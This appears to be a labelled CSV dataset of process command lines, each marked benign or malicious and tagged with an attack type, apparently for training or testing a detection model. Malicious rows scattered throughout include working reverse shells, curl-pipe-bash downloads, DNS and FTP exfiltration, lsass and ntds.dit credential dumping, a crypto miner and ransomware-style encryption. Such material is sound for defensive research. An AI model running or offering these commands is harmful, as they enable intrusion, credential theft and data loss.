process_name,command_line,label,attack_type
procdump.exe,procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\cca840f5b255fc2e7de8b577a745bcc9.dmp,malicious,credential_dumping
psql,psql -h 10.24.194.38 -U postgres -c 'REINDEX DATABASE warehouse' -q (user: postgres),benign,sql_exploitation
gpg,gpg --batch --yes --recipient backups@ad.example.com -e -o /srv/backups/manifest.gpg /srv/backups/nightly/incremental/manifest.tar,benign,ransomware
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\session_blob' -ExclusionExtension '.tmp' (approved CR-91),benign,defense_evasion
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\dataset_part /v Version /t REG_SZ /d 0.40.3 /f,benign,persistence
make,make -j53 all && make -j53 test (CI build farm node edge01),benign,crypto_miner
socat,"socat TCP-LISTEN:443,reuseaddr,fork TCP:10.0.153.163:5432",benign,reverse_shell
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\manifest /v Version /t REG_SZ /d 4.0.1 /f,benign,persistence
ssh,ssh -tt -i /etc/ci/deploy_key postgres@build08.prod.svc.cluster.local 'sudo systemctl restart design_spec',benign,reverse_shell
openssl,openssl pkcs12 -export -in /etc/ssl/session_blob.crt -inkey /etc/ssl/session_blob.key -out /srv/backups/certs/session_blob.pfx -passout pass:bdeca475c013,benign,credential_dumping
tar,tar czf - /usr/local/share/pipeline/artifacts/build | ssh -i /etc/ci/key backup@10.22.131.69 'cat > /srv/backups/manifest-4.14.8.tgz',benign,data_exfiltration
certutil.exe,certutil.exe -store My a799a9ca51c3,benign,credential_dumping
fluent-bit,fluent-bit -i tail -p path=/var/log/design_spec/*.log -o forward -p host=10.4.22.20 -p port=24224,benign,data_exfiltration
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /usr/local/share/pipeline/artifacts/build -Dest \\edge02\backups$ -Retain 38,benign,ransomware
gpupdate.exe,gpupdate.exe /force && gpresult /h C:\Logs\gpresult-node07.html,benign,defense_evasion
openssl,tar cz C:\Users\svc_backup\AppData\Local\Temp\cache | openssl enc -aes-256-cbc -k 2a6e3eca5c721f05184610f9a6454037 | curl -s --data-binary @- http://91.118.252.151/u,malicious,data_exfiltration
openssl,openssl enc -aes-256-cbc -salt -in /mnt/storage/shares/department/legal/audit_trail.db -out /mnt/storage/shares/department/legal/audit_trail.db.locked -k 9b1af2849958c5a7ba0be7afd747b864,malicious,ransomware
tar,tar czf - /data/warehouse/staging/landing/raw | ssh -i /etc/ci/key backup@10.23.157.102 'cat > /srv/backups/archive_set-1.21.5.tgz',benign,data_exfiltration
sqlcmd,sqlcmd -S 10.40.227.31 -E -i C:\Maintenance\reindex-manifest.sql -o C:\Logs\reindex-88.log (user: MSSQLSERVER),benign,sql_exploitation
dpkg,dpkg -i /opt/packages/snapshot-1.12.7_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
curl,curl -s -T /srv/reports/archive_set-3.1.3.pdf -u svc_report:$RPT_TOKEN https://reports.eng.example.net/api/v2/upload,benign,data_exfiltration
ldapsearch,"ldapsearch -x -H ldap://app02.ad.example.com -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
sccm,ccmexec.exe /deploy /package:dataset_part-8.18.7 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
dpkg,dpkg -i /opt/packages/archive_set-7.33.1_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.1.76.39:9091/metrics/job/customer_db -H 'Content-Type: application/json',benign,data_exfiltration
cmd.exe,"cmd.exe /c ""net user jenkins 8017e017d214b1f5 /add & net localgroup administrators jenkins /add"" (parent: sqlservr.exe)",malicious,sql_exploitation
mkfifo,mkfifo /tmp/.883354bd434cbd092cce03174720110a;cat /tmp/.883354bd434cbd092cce03174720110a|/bin/sh -i 2>&1|nc 45.134.140.195 443 >/tmp/.883354bd434cbd092cce03174720110a,malicious,reverse_shell
gpg,gpg --batch --yes --recipient backups@ad.example.com -e -o /srv/backups/report_final.gpg /usr/local/share/pipeline/artifacts/build/report_final.tar,benign,ransomware
powershell.exe,powershell.exe Invoke-Command -ComputerName ci07 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 3.28.9,benign,lateral_movement
powershell.exe,"powershell.exe -c ""Copy-Item 'C:\Users\build\AppData\Local\Google\Chrome\User Data\Default\Login Data' C:\Windows\Temp\d04c93e31e85443616a62298a3528562.db""",malicious,credential_dumping
pg_dump,pg_dump -h 10.19.225.150 -U postgres -Fc -j 4 -f /srv/backups/db/manifest-8.7.0.dump analytics (user: postgres),benign,sql_exploitation
ssh,ssh -tt -i /etc/ci/deploy_key jenkins@db01.ad.example.com 'sudo systemctl restart snapshot',benign,reverse_shell
winrm,winrm invoke Restart wmicimv2/Win32_Service?Name=BITS -r:http://worker11:5985,benign,lateral_movement
sccm,ccmexec.exe /deploy /package:customer_db-6.38.2 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
ssh,ssh -tt -i /etc/ci/deploy_key build@ci08.eng.example.net 'sudo systemctl restart report_final',benign,reverse_shell
robocopy,robocopy /var/lib/app/customer/exports \\worker09\backups$\customer_db /MIR /Z /R:3 /W:5 /LOG:C:\Logs\backup-19.log,benign,ransomware
chown,chown -R automation:automation /opt/app/releases/9.22.8 && chmod -R 750 /opt/app/releases/9.22.8,benign,privilege_escalation
psexec.exe,psexec.exe \\edge01 -u CORP\sysadmin -h -accepteula msiexec /i \\web11\sccm$\packages\payroll-0.29.2.msi /qn,benign,lateral_movement
pg_dump,pg_dump -h 10.29.41.236 -U admin -Fc -f /srv/backups/db/payroll-8.34.5.dump --no-password customers,benign,credential_dumping
cipher.exe,cipher.exe /e /s:C:\Users\ansible\Documents,malicious,ransomware
cat,cat /etc/shadow > /tmp/.796a38a0013b9befab89474233b0afbe/sh.txt,malicious,credential_dumping
nslookup,for f in $(ls /mnt/storage/shares/department/legal); do nslookup $(echo $f|base64).9db686415b10cd51.193.15.23.196; done,malicious,data_exfiltration
bash,bash -i >& /dev/tcp/91.245.55.24/8080 0>&1,malicious,reverse_shell
blender,blender -b /srv/render/design_spec.blend -o /srv/render/out/ -F PNG -x 1 -f 46 -- --cycles-device CPU,benign,crypto_miner
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 4.0.0"" dir=in action=allow protocol=TCP localport=4444",benign,defense_evasion
sqlcmd,sqlcmd -S 10.20.234.156 -E -i C:\Maintenance\reindex-telemetry_batch.sql -o C:\Logs\reindex-19.log (user: MSSQLSERVER),benign,sql_exploitation
openssl,openssl pkcs12 -export -in /etc/ssl/report_final.crt -inkey /etc/ssl/report_final.key -out /srv/backups/certs/report_final.pfx -passout pass:d0df851cf38e,benign,credential_dumping
cron,echo '*/15 * * * * sysadmin /opt/monitoring/collect-metrics.sh --push gateway://10.1.98.166:9091' > /etc/cron.d/metrics,benign,persistence
cron,echo '*/15 * * * * ansible /opt/monitoring/collect-metrics.sh --push gateway://10.5.98.114:9091' > /etc/cron.d/metrics,benign,persistence
sccm,ccmexec.exe /deploy /package:dataset_part-0.22.7 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
sshd,sshd --algo rx/0 -o 5.236.63.27:2222 -u 310470bf162a4a8ae83e931168824745 --background --max-cpu-usage 90 (masquerade),malicious,crypto_miner
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\ledger_2024 /v Version /t REG_SZ /d 7.32.7 /f,benign,persistence
perl,"perl -e 'use Socket;$i=""185.235.230.17"";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));exec(""/bin/sh -i"");'",malicious,reverse_shell
gpg,gpg --batch --yes --passphrase 899bff595056bf30 -c /var/lib/app/customer/exports/ledger_2024.xlsx && shred -u /var/lib/app/customer/exports/ledger_2024.xlsx,malicious,ransomware
ldapsearch,"ldapsearch -x -H ldap://node08.internal.acme.io -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
python3,python3 -m http.server 443 --directory /srv/artifacts/session_blob --bind 10.29.10.46,benign,reverse_shell
bash,"bash -c 'id; uname -a; curl -s http://5.75.235.13/f70043b68b8c4580|bash' (parent: postgres, COPY TO PROGRAM)",malicious,sql_exploitation
powershell.exe,"powershell.exe -c ""Invoke-Command -ComputerName db08 -ScriptBlock { iex (New-Object Net.WebClient).DownloadString('http://185.174.234.245/73e4629974e50c16') }""",malicious,lateral_movement
chown,chown -R admin:admin /opt/app/releases/5.5.9 && chmod -R 750 /opt/app/releases/5.5.9,benign,privilege_escalation
tar,tar -czf /srv/backups/nightly/payroll-8.17.7.tar.gz /mnt/storage/shares/department/legal --exclude='*.tmp',benign,ransomware
sysbench,sysbench cpu --cpu-max-prime=20000 --threads=12 --time=300 run,benign,crypto_miner
certutil.exe,certutil.exe -urlcache -f http://193.173.219.49/a4a2fd64d2c3 C:\Temp\a4a2fd64d2c3.exe (parent: sqlservr.exe),malicious,sql_exploitation
xmrig,xmrig --url 185.102.246.73:5986 --user cfd4a43ca8e4d035 --coin monero --donate-level 1 --background --no-color,malicious,crypto_miner
restic,restic -r sftp:svc_backup@ci04.prod.svc.cluster.local:/backups backup /mnt/storage/shares/department/legal --tag nightly --exclude-caches,benign,ransomware
sqlcmd,sqlcmd -S 10.34.168.239 -E -i C:\Maintenance\reindex-snapshot.sql -o C:\Logs\reindex-59.log (user: MSSQLSERVER),benign,sql_exploitation
powershell.exe,powershell.exe Invoke-Command -ComputerName db11 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 4.13.7,benign,lateral_movement
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\design_spec /v Version /t REG_SZ /d 2.29.1 /f,benign,persistence
ldapsearch,"ldapsearch -x -H ldap://app12.ad.example.com -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
pg_basebackup,pg_basebackup -h 10.39.99.207 -U replicator -D /var/lib/postgresql/standby -Fp -Xs -P (user: postgres),benign,sql_exploitation
ansible-playbook,ansible-playbook -i inventory/prod site.yml --limit node05 --tags deploy --extra-vars 'version=3.22.3',benign,lateral_movement
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-4.39.9.wfw,benign,defense_evasion
powershell.exe,powershell.exe Invoke-Command -ComputerName node06 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 3.1.7,benign,lateral_movement
docker,docker run --rm --cpus 58 buildkit:latest build --tag report_final:2.31.5 /workspace,benign,crypto_miner
make,make -j9 all && make -j9 test (CI build farm node web08),benign,crypto_miner
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /usr/local/share/pipeline/artifacts/build -Dest \\build12\backups$ -Retain 31,benign,ransomware
ssh,ssh jenkins@10.39.170.112 'curl -s http://193.102.122.46/53929587bfe0 | bash',malicious,lateral_movement
rclone,rclone copy /mnt/storage/shares/department/legal mega:/exfil/bfe9ddf26f44 --transfers 16 --ignore-existing -q,malicious,data_exfiltration
socat,"socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.40.236.90:5432",benign,reverse_shell
gpg,gpg --batch --yes --recipient backups@ad.example.com -e -o /srv/backups/design_spec.gpg C:\ProgramData\Vendor\Telemetry\spool/design_spec.tar,benign,ransomware
docker,docker run --rm --cpus 62 buildkit:latest build --tag archive_set:7.32.9 /workspace,benign,crypto_miner
systemd,/tmp/.00eaa139b1c6/systemd -c /tmp/.00eaa139b1c6/config.json --cpu-max-threads-hint 100,malicious,crypto_miner
apt-get,apt-get install -y --no-install-recommends vendor-agent=1.27.3 && systemctl enable vendor-agent,benign,persistence
duplicity,duplicity --full-if-older-than 7D --encrypt-key f98c385aafe4d8e4 C:\ProgramData\Vendor\Telemetry\spool file:///srv/backups/dup/db05,benign,ransomware
terraform,terraform apply -auto-approve -target=module.cluster.node.db04 -var image_version=4.38.4,benign,lateral_movement
sc.exe,"sc.exe create Dnscache binPath= ""C:\ProgramData\012abc0da95ceed1.exe"" start= auto error= ignore",malicious,persistence
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\421bbb44f3c9 -FilePath C:\Backups\certs\payroll.cer,benign,credential_dumping
curl,curl -s -T /srv/reports/report_final-8.9.0.pdf -u svc_report:$RPT_TOKEN https://reports.internal.acme.io/api/v2/upload,benign,data_exfiltration
powershell.exe,"powershell.exe ""(Get-Item C:\Temp\2f430946a94e7d91.exe).LastWriteTime=(Get-Date '2020-03-15')""",malicious,defense_evasion
ssh,ssh -N -L 53:localhost:5432 build@edge01.internal.acme.io,benign,reverse_shell
docker,docker run --rm --cpus 8 buildkit:latest build --tag dataset_part:1.5.2 /workspace,benign,crypto_miner
cmd.exe,"cmd.exe /c bcp ""SELECT * FROM sys.databases"" queryout C:\Temp\a3f9213676dd.dat -c -T (parent: sqlservr.exe)",malicious,sql_exploitation
apt-get,apt-get install -y --no-install-recommends vendor-agent=2.16.9 && systemctl enable vendor-agent,benign,persistence
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\design_spec C:\Backups\reg\design_spec-2.5.9.reg /y,benign,credential_dumping
cron,echo '*/15 * * * * www-data /opt/monitoring/collect-metrics.sh --push gateway://10.5.235.179:9091' > /etc/cron.d/metrics,benign,persistence
curl,curl -s -T /srv/reports/payroll-2.27.9.pdf -u svc_report:$RPT_TOKEN https://reports.corp.local/api/v2/upload,benign,data_exfiltration
duplicity,duplicity --full-if-older-than 7D --encrypt-key 9db686415b10cd51 /usr/local/share/pipeline/artifacts/build file:///srv/backups/dup/edge10,benign,ransomware
scp,scp -i /etc/ci/deploy_key build/archive_set-7.24.7.tar.gz postgres@db04.corp.local:/opt/app/releases/,benign,lateral_movement
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-3.36.9.wfw,benign,defense_evasion
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\dataset_part C:\Backups\reg\dataset_part-8.10.0.reg /y,benign,credential_dumping
ufw,ufw allow from 10.27.204.232/24 to any port 8080 proto tcp comment 'app cluster 9.11.3',benign,defense_evasion
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\audit_trail C:\Backups\reg\audit_trail-7.28.6.reg /y,benign,credential_dumping
gzip,tar c /home/release/Documents/Finance/Q2 | gzip -9 | wc -c (compression ratio QA check),benign,crypto_miner
powershell.exe,"powershell.exe ""(Get-Item C:\Temp\1a016804a4a872530498e94ddfe08493.exe).LastWriteTime=(Get-Date '2017-05-12')""",malicious,defense_evasion
hashcat,"hashcat -b -m 0 -D 1 --quiet (benchmark only, QA validation node cache01)",benign,crypto_miner
powershell.exe,"powershell.exe ""(Get-Item C:\Temp\9fc189a05a3a1426f6bd57670b5fa393.exe).LastWriteTime=(Get-Date '2019-01-01')""",malicious,defense_evasion
pg_dump,pg_dump -h 10.36.117.142 -U postgres -Fc -j 4 -f /srv/backups/db/ledger_2024-9.9.9.dump analytics (user: postgres),benign,sql_exploitation
chown,chown -R www-data:www-data /opt/app/releases/7.40.4 && chmod -R 750 /opt/app/releases/7.40.4,benign,privilege_escalation
sh,"sh -c 'cp /bin/bash /tmp/.1cf4ab443fb6b906; chmod 4755 /tmp/.1cf4ab443fb6b906' (parent: mysqld, user: mysql)",malicious,sql_exploitation
apt-get,apt-get install -y --no-install-recommends vendor-agent=9.12.3 && systemctl enable vendor-agent,benign,persistence
ssh,ssh -tt -i /etc/ci/deploy_key automation@cache09.corp.local 'sudo systemctl restart telemetry_batch',benign,reverse_shell
rsync,rsync -az --partial --bwlimit=20000 /var/log/archive_set/ logsink@10.19.225.150:/data/logs/app11/,benign,data_exfiltration
pg_dump,pg_dump -h 10.4.22.20 -U build -Fc -f /srv/backups/db/report_final-5.32.6.dump --no-password customers,benign,credential_dumping
docker,docker run --rm --cpus 6 buildkit:latest build --tag session_blob:2.36.0 /workspace,benign,crypto_miner
findstr,findstr /si password C:\Users\ops\*.config C:\Users\ops\*.xml > C:\Temp\cca840f5b255fc2e7de8b577a745bcc9.txt,malicious,credential_dumping
sc.exe,sc.exe config LanmanServer start= auto (corporate baseline GPO f59e2b8e3428),benign,defense_evasion
nslookup,for f in $(ls /srv/data/projects/2024); do nslookup $(echo $f|base64).d598050b917c6e7b00eda90371cdcfa2.193.218.107.78; done,malicious,data_exfiltration
ffmpeg,ffmpeg -i /srv/media/design_spec.mov -c:v libx264 -preset slow -crf 18 -threads 25 /srv/media/out/design_spec.mp4,benign,crypto_miner
dpkg,dpkg -i /opt/packages/ledger_2024-0.3.0_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
powershell.exe,"powershell.exe ""(Get-Item C:\Temp\dfb024707c175857.exe).LastWriteTime=(Get-Date '2020-03-15')""",malicious,defense_evasion
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance db11 -Database design_spec -BackupFile 'X:\backups\design_spec-9.21.2.bak' (user: MSSQLSERVER),benign,sql_exploitation
ansible-playbook,ansible-playbook -i inventory/prod site.yml --limit svc11 --tags deploy --extra-vars 'version=1.2.7',benign,lateral_movement
tmux,"tmux new-session -d -s deploy 'ssh release@db05 ""journalctl -u snapshot -f""'",benign,reverse_shell
dpkg,dpkg -i /opt/packages/design_spec-1.7.3_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
scp,scp -i /etc/ci/deploy_key build/ledger_2024-2.21.1.tar.gz postgres@cache03.internal.acme.io:/opt/app/releases/,benign,lateral_movement
runas.exe,"runas.exe /user:CORP\svc_deploy ""msiexec /i \\app10\sccm$\dataset_part-9.21.8.msi /qn""",benign,privilege_escalation
apt-get,apt-get install -y --no-install-recommends vendor-agent=1.30.4 && systemctl enable vendor-agent,benign,persistence
ssh,ssh -N -L 4444:localhost:5432 svc_backup@svc08.prod.svc.cluster.local,benign,reverse_shell
rundll32.exe,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\8af256033888bf818b0f5334de22c64b.dmp full",malicious,credential_dumping
curl,curl -s -T /srv/reports/manifest-5.35.0.pdf -u svc_report:$RPT_TOKEN https://reports.corp.local/api/v2/upload,benign,data_exfiltration
rsync,rsync -aHAX --delete --partial /usr/local/share/pipeline/artifacts/build/ /srv/backups/incremental/node08/,benign,ransomware
ufw,ufw allow from 10.4.22.20/24 to any port 2222 proto tcp comment 'app cluster 8.15.8',benign,defense_evasion
socat,"socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.39.141.197:5432",benign,reverse_shell
tar,tar czf - /data/warehouse/staging/landing/raw | curl -s -T - ftp://5.52.169.18/incoming/a8864878b44c3a1c8e84e566c2c7d023.tgz --user ops:a8864878b44c3a1c8e84e566c2c7d023,malicious,data_exfiltration
ufw,ufw allow from 10.2.193.52/24 to any port 2222 proto tcp comment 'app cluster 4.5.4',benign,defense_evasion
ab,ab -n 100000 -c 500 -k https://cache11.prod.svc.cluster.local/healthz,benign,crypto_miner
ssh,ssh -tt -i /etc/ci/deploy_key sysadmin@node04.ad.example.com 'sudo systemctl restart report_final',benign,reverse_shell
tar,tar czf - /var/lib/app/customer/exports | ssh -i /etc/ci/key backup@10.40.52.202 'cat > /srv/backups/snapshot-7.39.1.tgz',benign,data_exfiltration
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.3.87.82:9091/metrics/job/snapshot -H 'Content-Type: application/json',benign,data_exfiltration
systemctl,systemctl enable --now telemetry_batch-telemetry.timer,benign,persistence
dpkg,dpkg -i /opt/packages/manifest-4.39.6_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
docker,docker run --rm --cpus 37 buildkit:latest build --tag audit_trail:1.0.6 /workspace,benign,crypto_miner
dpkg,dpkg -i /opt/packages/audit_trail-7.6.6_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
bash,bash -i >& /dev/tcp/193.196.96.207/8443 0>&1,malicious,reverse_shell
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-7.22.6.reg /y,benign,credential_dumping
sqlpackage,sqlpackage /Action:Export /SourceServerName:svc07 /SourceDatabaseName:manifest /TargetFile:X:\dac\manifest.bacpac (user: MSSQLSERVER),benign,sql_exploitation
python3,python3 -m http.server 5985 --directory /srv/artifacts/archive_set --bind 10.22.134.185,benign,reverse_shell
ansible,ansible svc12* -m shell -a 'systemctl restart app && systemctl status app' --become,benign,lateral_movement
pg_dump,pg_dump -h 10.14.21.183 -U sysadmin -Fc -f /srv/backups/db/ledger_2024-4.13.1.dump --no-password customers,benign,credential_dumping
tar,tar -czf /srv/backups/nightly/report_final-1.4.3.tar.gz C:\Users\build\AppData\Local\Temp\cache --exclude='*.tmp',benign,ransomware
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 1.21.0"" dir=in action=allow protocol=TCP localport=31337",benign,defense_evasion
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\telemetry_batch /v Version /t REG_SZ /d 1.22.6 /f,benign,persistence
esentutl.exe,esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\12d013e1af67.dit,malicious,credential_dumping
sccm,ccmexec.exe /deploy /package:design_spec-7.14.9 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.14.170.102:9091/metrics/job/payroll -H 'Content-Type: application/json',benign,data_exfiltration
zfs,zfs snapshot tank/data/web03@nightly-1738,benign,ransomware
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.5.98.114:9091/metrics/job/dataset_part -H 'Content-Type: application/json',benign,data_exfiltration
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\telemetry_batch /v Version /t REG_SZ /d 0.2.3 /f,benign,persistence
apt-get,apt-get install -y --no-install-recommends vendor-agent=4.16.2 && systemctl enable vendor-agent,benign,persistence
powershell.exe,"powershell.exe -c ""Copy-Item 'C:\Users\release\AppData\Local\Google\Chrome\User Data\Default\Login Data' C:\Windows\Temp\a62bf3f5f5762ed3.db""",malicious,credential_dumping
wmic.exe,"wmic.exe /node:10.14.170.102 /user:release process call create ""cmd /c certutil -urlcache -f http://5.184.214.94/c0a3e15a4479a13463b543f8ba274f9a %TEMP%\c0a3e15a4479a13463b543f8ba274f9a""",malicious,lateral_movement
socat,"socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.13.98.36:5432",benign,reverse_shell
dpkg,dpkg -i /opt/packages/telemetry_batch-9.31.1_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
